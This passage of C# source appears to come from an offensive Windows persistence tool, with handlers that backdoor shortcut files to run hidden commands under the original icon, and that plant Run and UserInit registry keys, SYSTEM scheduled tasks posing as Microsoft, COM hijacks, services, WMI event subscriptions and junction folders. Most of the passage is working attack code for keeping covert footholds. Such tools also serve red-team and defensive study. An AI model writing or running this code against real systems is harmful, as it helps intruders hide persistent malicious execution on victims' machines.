        }

        static void BackDoorLNK(string lnkpath, string command, bool cleanup = false)
        {
            if (!System.IO.File.Exists(lnkpath))
            {
                Console.WriteLine("[-] Lnk {0} does not exist", lnkpath);
                Environment.Exit(1);
            }

            WshShell wshell = new WshShell();
            IWshShortcut lnk = (IWshShortcut)wshell.CreateShortcut(lnkpath);
            string tp = lnk.TargetPath;
            string wd = lnk.WorkingDirectory;
            string ic = lnk.IconLocation;
            int ws = lnk.WindowStyle;
            Console.WriteLine("[+] Current {0} runs {1}", lnkpath, tp);
            Console.WriteLine();

            if (cleanup == true)
            {
                lnk.TargetPath = command;
                lnk.Arguments = null;
                lnk.WindowStyle = 1;
                lnk.Save();
                Console.WriteLine("[+] Restored {0} to run {1}", lnkpath, command);
            }
            else
            {
                List<string> retcmd = ParseCommand(command);
                string Directory = retcmd[0];
                string Binary = retcmd[1];
                string Parameters = retcmd[2];
                string uptp = String.Format("{0}\\{1}", Directory, Binary);
                string upic = String.Format("{0},0", tp);
                lnk.TargetPath = uptp;
                lnk.Arguments = Parameters;
                lnk.WorkingDirectory = wd;
                lnk.IconLocation = upic;
                lnk.WindowStyle = 7;
                lnk.Save();
                Console.WriteLine("[+] Updated {0} to run {1}", lnkpath, command);
            }
        }

        static List<string> DirSearch(string dir)
        {
            List<string> files = new List<string>();
            try
            {
                foreach (string f in Directory.GetFiles(dir))
                {
                    files.Add(f);
                }
                foreach (string d in Directory.GetDirectories(dir))
                {
                    files.AddRange(DirSearch(d));
                }
            }
            catch (Exception)
            { }
            return files;
        }

        static List<string> GetDirs(string dir)
        {
            List<string> files = new List<string>();
            try
            {
                foreach (string d in Directory.GetDirectories(dir))
                {
                    files.Add(d);
                    files.AddRange(GetDirs(d));
                }
            }
            catch (Exception)
            { }
            return files;
        }

        static List<string> ParseCommand(string command)
        {
            List<string> cmdinfo = new List<string>();
            string cmdpath = null;
            string cmdarg = null;
            string[] casplit = new string[2];
            //For now this will dictate a win path
            var spacecount = command.Count(x => x == ' ');
            if (spacecount == 1)
            {
                casplit = command.Split(new[] { ' ' }, 2);
                int counter = casplit[0].LastIndexOf('\\');
                cmdpath = command.Substring(0, counter);
                casplit[0] = casplit[0].Substring(counter);
                casplit[0] = casplit[0].Replace("\\", "");
            }
            else if (command.Contains(":") && command.Contains("\\"))
            {
                //If you have more than two full directory paths I'll be sad
                var colcount = command.Count(xx => xx == ':');
                if (colcount > 1)
                {
                    int col = command.LastIndexOf(':');

                    cmdpath = command.Substring(0, col - 2);
                    cmdarg = command.Substring(col - 1);
                    int slh = cmdpath.LastIndexOf('\\');
                    if (command.Contains(" "))
                    {
                        casplit[0] = cmdpath.Substring(slh);
                        casplit[0] = casplit[0].Replace("\\", "");
                        casplit[1] = cmdarg;
			cmdpath = cmdpath.Replace("\\" + casplit[0], "");
                    }
                    else
                    {
                        casplit[0] = cmdarg;
                        casplit[1] = "";
                    }
                }
                else
                {
                    int counter = command.LastIndexOf('\\');
                    if (counter != -1)
                    {
                        cmdpath = command.Substring(0, counter);
                        cmdarg = command.Substring(counter + 1);
                        if (command.Contains(" "))
                        {
                            casplit = cmdarg.Split(new[] { ' ' }, 2);
                        }
                        else
                        {
                            casplit[0] = cmdarg;
                            casplit[1] = "";
                        }
                    }
                }
            }
            else
            {
                //If no path I'm assuming it's system32
                cmdpath = "C:\\Windows\\system32";
                if (command.Contains(" "))
                {
                    casplit = command.Split(new[] { ' ' }, 2);
                }
                else
                {
                    casplit[0] = command;
                    casplit[1] = "";
                }

            }
            cmdinfo.Add(cmdpath);
            cmdinfo.Add(casplit[0]);
            cmdinfo.Add(casplit[1]);
            return cmdinfo;
        }

        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                HowTo();
                return;
            }

            try
            {
                var arguments = new Dictionary<string, string>();
                foreach (string argument in args)
                {
                    int idx = argument.IndexOf('=');
                    if (idx > 0)
                        arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                }

                if (!arguments.ContainsKey("action"))
                {
                    HowTo();
                    return;
                }
                if (arguments["action"].ToLower() == "elevatedwmiregistry")
                {
                    if (!arguments.ContainsKey("command") || !arguments.ContainsKey("keyname"))
                    {
                        HowTo();
                        return;
                    }
                    else
                    {
                        string keyname = arguments["keyname"];
                        string command = arguments["command"];
                        WMIElevatedRunKey(keyname, command);
                    }

                }
                else if (arguments["action"].ToLower() == "elevatedregistrykey")
                {
                    if (arguments.ContainsKey("cleanup") && !arguments.ContainsKey("keyname"))
                    {
                        HowTo();
                        return;
                    }
                    else if (!arguments.ContainsKey("keyname") || !arguments.ContainsKey("command") && !arguments.ContainsKey("cleanup"))
                    {
                        HowTo();
                        return;
                    }
                    else
                    {
                        bool cleanup = false;
                        string keypath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
                        string keyname = arguments["keyname"];
                        string command = "";
                        if (arguments.ContainsKey("cleanup"))
                        {
                            cleanup = true;
                        }
                        if (arguments.ContainsKey("command"))
                        {
                            command = arguments["command"];
                        }
                        if (arguments.ContainsKey("keypath"))
                        {
                            keypath = arguments["keypath"];
                        }
                        ElevatedRegistryKey(keyname, command, keypath, cleanup);
                    }
                }
                else if (arguments["action"].ToLower() == "userregistrykey")
                {
                    if (arguments.ContainsKey("cleanup") && !arguments.ContainsKey("keyname"))
                    {
                        HowTo();
                        return;
                    }
                    else if (!arguments.ContainsKey("keyname") || !arguments.ContainsKey("command") && !arguments.ContainsKey("cleanup"))
                    {
                        HowTo();
                        return;
                    }
                    else
                    {
                        bool cleanup = false;
                        string keypath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
                        string keyname = arguments["keyname"];
                        string command = "";
                        if (arguments.ContainsKey("cleanup"))
                        {
                            cleanup = true;
                        }
                        if (arguments.ContainsKey("command"))
                        {
                            command = arguments["command"];
                        }
                        if (arguments.ContainsKey("keypath"))
                        {
                            keypath = arguments["keypath"];
                        }
                        UserRegistryKey(keyname, command, keypath, cleanup);
                    }
                }
                else if (arguments["action"].ToLower() == "userinitmprlogonscriptkey")
                {
                    if (!arguments.ContainsKey("command") && !arguments.ContainsKey("cleanup"))
                    {
                        HowTo();
                        return;
                    }
                    else
                    {
                        bool cleanup = false;
                        string command = "";
                        if (arguments.ContainsKey("command"))
                        {
                            command = arguments["command"];
                        }
                        if (arguments.ContainsKey("cleanup"))
                        {
                            cleanup = true;
                        }
                        UserInitMprLogonScriptKey(command, cleanup);
                    }

                }
                else if (arguments["action"].ToLower() == "elevateduserinitkey")
                {
                    if (!arguments.ContainsKey("command") && !arguments.ContainsKey("cleanup"))
                    {
                        HowTo();
                        return;
                    }
                    else
                    {
                        string command = "";
                        bool cleanup = false;
                        if (arguments.ContainsKey("command"))
                        {
                            command = arguments["command"];
                        }
                        if (arguments.ContainsKey("cleanup"))
                        {
                            cleanup = true;
                        }
                        ElevatedRegistryUserInitKey(command, cleanup);
                    }
                }
                else if (arguments["action"].ToLower() == "scheduledtask")
                {
                    // Maybe allow modifcation to days of week, days on month and months of year
                    string taskname = "DebugTask";
                    if (arguments.ContainsKey("taskname"))
                    {
                        taskname = arguments["taskname"];
                    }
                    if (arguments.ContainsKey("cleanup"))
                    {
                        DeleteScheduledTask(taskname);
                    }
                    else
                    {
                        string runasuser = "SYSTEM";
                        string logonuser = Environment.UserName;
                        string author = "Microsoft Corporation";
                        string description = "Microsoft Task";
                        string attime = "10:00:00";
                        string startat = "2017-07-01";
                        string rep = null;
                        if (arguments.ContainsKey("cleanup") && !arguments.ContainsKey("taskname"))
                        {
                            HowTo();
                            return;
                        }
                        if (arguments.ContainsKey("runasuser"))
                        {
                            runasuser = arguments["runasuser"];
                        }
                        if (!arguments.ContainsKey("triggertype") || !arguments.ContainsKey("command"))
                        {
                            HowTo();
                            return;
                        }
                        if (arguments.ContainsKey("author"))
                        {
                            author = arguments["author"];
                        }
                        if (arguments.ContainsKey("description"))
                        {
                            description = arguments["description"];
                        }
                        if (arguments.ContainsKey("rep"))
                        {
                            rep = arguments["rep"];
                        }
                        if (arguments.ContainsKey("attime"))
                        {
                            attime = arguments["attime"];
                        }
                        if (arguments.ContainsKey("startat"))
                        {
                            startat = arguments["startat"];
                        }
                        if (arguments.ContainsKey("logonuser"))
                        {
                            startat = arguments["logonuser"];
                        }
                        CreateScheduledTask(taskname, arguments["command"], runasuser, arguments["triggertype"], author, description, rep, attime, startat, logonuser);
                    }
                }
                else if (arguments["action"].ToLower() == "listscheduledtasks")
                {
                    ListScheduledTasks();
                }
                else if (arguments["action"].ToLower() == "scheduledtaskaction")
                {
                    string sfolder = string.Empty;
                    string actionid = string.Empty;
                    bool cleanup = false;
                    if (!arguments.ContainsKey("taskname") || !arguments.ContainsKey("command"))
                    {
                        HowTo();
                        return;
                    }
                    else
                    {
                        string taskname = arguments["taskname"];
                        string command = arguments["command"];
                        if (arguments.ContainsKey("folder"))
                        {
                            sfolder = arguments["folder"];
                        }
                        if (arguments.ContainsKey("actionid"))
                        {
                            actionid = arguments["actionid"];
                        }
                        if (arguments.ContainsKey("cleanup"))
                        {
                            cleanup = true;
                        }
                        AddScheduledTaskAction(taskname, command, sfolder, actionid, cleanup);
                    }
                }
                else if (arguments["action"].ToLower() == "schtaskcomhijack")
                {
                    if (arguments.ContainsKey("cleanup") && !arguments.ContainsKey("clsid"))
                    {
                        HowTo();
                        return;
                    }
                    if (!arguments.ContainsKey("clsid") || !arguments.ContainsKey("dllpath") && !arguments.ContainsKey("cleanup"))
                    {
                        HowTo();
                        return;
                    }
                    else
                    {
                        string clsid = arguments["clsid"];
                        string dllpath = string.Empty;
                        bool cleanup = false;
                        if (arguments.ContainsKey("dllpath"))
                        {
                            dllpath = arguments["dllpath"];
                        }
                        if (arguments.ContainsKey("cleanup"))
                        {
                            cleanup = true;
                        }
                        SchTskCOMHijack(clsid, dllpath, cleanup);
                    }
                }
                else if (arguments["action"].ToLower() == "createservice")
                {
                    string servicename = "WinSvc32";
                    if (arguments.ContainsKey("servicename"))
                    {
                        servicename = arguments["servicename"];
                    }

                    if (arguments.ContainsKey("cleanup"))
                    {
                        DeleteService(servicename);
                    }
                    else
                    {
                        if (!arguments.ContainsKey("command"))
                        {
                            HowTo();
                            return;
                        }
                        string command = arguments["command"];
                        CreateService(servicename, command);
                    }

                }
                else if (arguments["action"].ToLower() == "listrunningservices")
                {
                    ListRunningServices();
                }
                else if (arguments["action"].ToLower() == "wmieventsub")
                {
                    string eventname = "WinEvent";
                    string attime = "10:00";
                    string command = "";
                    bool cleanup = false;
                    if (arguments.ContainsKey("cleanup") && !arguments.ContainsKey("eventname"))
                    {
                        HowTo();
                        return;
                    }
                    else if (!arguments.ContainsKey("eventname") || !arguments.ContainsKey("command") && !arguments.ContainsKey("cleanup"))
                    {
                        HowTo();
                        return;
                    }
                    else
                    {
                        if (arguments.ContainsKey("cleanup"))
                        {
                            cleanup = true;
                        }
                        if (arguments.ContainsKey("eventname"))
                        {
                            eventname = arguments["eventname"];
                        }
                        if (arguments.ContainsKey("attime"))
                        {
                            if (arguments["attime"] == "startup" || arguments["attime"].Contains(":"))
                            {
                                attime = arguments["attime"];
                            }
                            else
                            {
                                Console.WriteLine("[-] Invalid 'attime', accepts 'startup' or time as '10:00'");
                                HowTo();
                                return;
                            }
                        }
                        if (arguments.ContainsKey("command"))
                        {
                            command = arguments["command"];
                        }
                        WMIEventSub(eventname, command, attime, cleanup);
                    }
                }
                else if (arguments["action"].ToLower() == "getscheduledtaskcomhandler")
                {
                    GetScheduledTaskComHandler();
                }
                else if (arguments["action"].ToLower() == "junctionfolder")
                {
                    if (arguments.ContainsKey("cleanup") && !arguments.ContainsKey("guid"))
                    {
                        HowTo();
                        return;
                    }
                    else if (!arguments.ContainsKey("dllpath") && !arguments.ContainsKey("cleanup"))
                    {
                        HowTo();
                        return;
                    }
                    else
                    {
                        bool cleanup = false;
                        string guid = null;
                        string dllpath = null;
                        if (arguments.ContainsKey("dllpath"))
                        {
                            dllpath = arguments["dllpath"];
                        }
                        if (arguments.ContainsKey("cleanup"))
                        {
                            cleanup = true;
                        }
                        if (arguments.ContainsKey("guid"))
                        {
                            guid = arguments["guid"];
                        }
                        JunctionFolder(dllpath, cleanup, guid);
                    }
                }
                else if (arguments["action"].ToLower() == "startupdirectory")
                {

                }
                else if (arguments["action"].ToLower() == "newlnk")
                {
                    if (!arguments.ContainsKey("filepath") || !arguments.ContainsKey("lnkname") || !arguments.ContainsKey("lnktarget"))
                    {
                        HowTo();
                        return;
                    }
                    else
                    {
                        string filepath = arguments["filepath"];
                        string lnkname = arguments["lnkname"];
                        string lnktarget = arguments["lnktarget"];
                        string lnkicon = arguments["lnktarget"];
                        if (arguments.ContainsKey("lnkicon"))
                        {
                            lnkicon = arguments["lnkicon"];
                        }
                        NewLnk(filepath, lnkname, lnktarget, lnkicon);
                    }
                }
                else if (arguments["action"].ToLower() == "backdoorlnk")
                {
                    if (!arguments.ContainsKey("lnkpath") || !arguments.ContainsKey("command"))
                    {
                        HowTo();
                        return;
                    }
                    else
                    {
                        bool cleanup = false;
                        string lnkpath = arguments["lnkpath"];
                        string command = arguments["command"];
                        if (arguments.ContainsKey("cleanup"))
                        {
                            cleanup = true;
                        }
                        BackDoorLNK(lnkpath, command, cleanup);
                    }
                }
                else if (arguments["action"].ToLower() == "listtasknames")
                {
                    ListTaskNames();
                }
                else
                {
                    HowTo();
                    return;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.WriteLine(e.StackTrace);
            }
        }

        // I'll fix later
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll")]
        private static extern int StartService(IntPtr serviceHandle, int dwNumServiceArgs, string lpServiceArgVectors);

        [DllImport("advapi32.dll")]
        public static extern int DeleteService(IntPtr serviceHandle);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, SERVICE_ACCESS dwDesiredAccess);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool ChangeServiceConfig(
            IntPtr hService,
            uint nServiceType,
            uint nStartType,
            uint nErrorControl,
            string lpBinaryPathName,
            string lpLoadOrderGroup,
            IntPtr lpdwTagId,
            [In] char[] lpDependencies,
            string lpServiceStartName,
            string lpPassword,
            string lpDisplayName);

        [DllImport("Advapi32.dll")]
        public static extern IntPtr CreateService(
            IntPtr serviceControlManagerHandle,
            string lpSvcName,
            string lpDisplayName,
            SERVICE_ACCESS dwDesiredAccess,
            uint dwServiceType,
            uint dwStartType,
            uint dwErrorControl,
            string lpPathName,
            string lpLoadOrderGroup,
            IntPtr lpdwTagId,
            string lpDependencies,
            string lpServiceStartName,
            string lpPassword);

        [DllImport("advapi32.dll", EntryPoint = "CloseServiceHandle")]
        private static extern int CloseServiceHandle(IntPtr hSCObject);

        private const uint SC_MANAGER_CONNECT = 0x0001;
        private const uint SC_MANAGER_CREATE_SERVICE = 0x00002;
        private const uint SERVICE_QUERY_CONFIG = 0x00000001;
        private const uint SERVICE_CHANGE_CONFIG = 0x00000002;
        private const uint SERVICE_NO_CHANGE = 0xFFFFFFFF;
        private const uint SERVICE_START = 0x0010;
        private const uint SERVICE_WIN32_OWN_PROCESS = 0x00000010;
        private const uint SERVICE_AUTO_START = 0x00000002;
        private const uint SERVICE_ERROR_NORMAL = 0x00000001;

        public enum ServiceStartupType : uint
        {
            BootStart = 0,
            SystemStart = 1,
            Automatic = 2,
            Manual = 3,
            Disabled = 4
        }

        [Flags]
        public enum SERVICE_ACCESS : uint
        {
            STANDARD_RIGHTS_REQUIRED = 0xF0000,
            SERVICE_QUERY_CONFIG = 0x00001,
            SERVICE_CHANGE_CONFIG = 0x00002,
            SERVICE_QUERY_STATUS = 0x00004,
            SERVICE_ENUMERATE_DEPENDENTS = 0x00008,
            SERVICE_START = 0x00010,
            SERVICE_STOP = 0x00020,
            SERVICE_PAUSE_CONTINUE = 0x00040,
            SERVICE_INTERROGATE = 0x00080,
            SERVICE_USER_DEFINED_CONTROL = 0x00100,
            SERVICE_ALL_ACCESS =
                (STANDARD_RIGHTS_REQUIRED | SERVICE_QUERY_CONFIG | SERVICE_CHANGE_CONFIG | SERVICE_QUERY_STATUS | SERVICE_ENUMERATE_DEPENDENTS | SERVICE_START | SERVICE_STOP | SERVICE_PAUSE_CONTINUE
                 | SERVICE_INTERROGATE | SERVICE_USER_DEFINED_CONTROL)
        }
    }
}
